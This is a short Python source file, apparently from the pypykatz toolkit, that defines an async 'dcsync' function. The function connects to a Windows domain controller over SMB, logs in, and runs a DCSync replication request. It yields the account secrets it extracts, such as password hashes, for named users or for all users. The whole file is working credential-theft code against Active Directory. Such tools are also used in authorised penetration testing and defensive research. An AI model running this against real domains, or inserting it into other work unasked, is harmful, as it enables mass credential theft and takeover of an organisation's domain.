import asyncio
from pypykatz import logger

async def dcsync(url, username = None):
	from aiosmb.commons.connection.factory import SMBConnectionFactory
	from aiosmb.commons.interfaces.machine import SMBMachine

	smburl = SMBConnectionFactory.from_url(url)
	connection = smburl.get_connection()

	users = []
	if username is not None:
		users.append(username)

	async with connection:
		logger.debug('[DCSYNC] Connecting to server...')
		_, err = await connection.login()
		if err is not None:
			raise err
		
		logger.debug('[DCSYNC] Connected to server!')
		logger.debug('[DCSYNC] Running...')

		i = 0
		async with SMBMachine(connection) as machine:
			async for secret, err in machine.dcsync(target_users=users):
				if err is not None:
					raise err
				i += 1
				if i % 1000 == 0:
					logger.debug('[DCSYNC] Running... %s' % i)
				await asyncio.sleep(0)
				yield secret
		
		logger.debug('[DCSYNC] Finished!')
		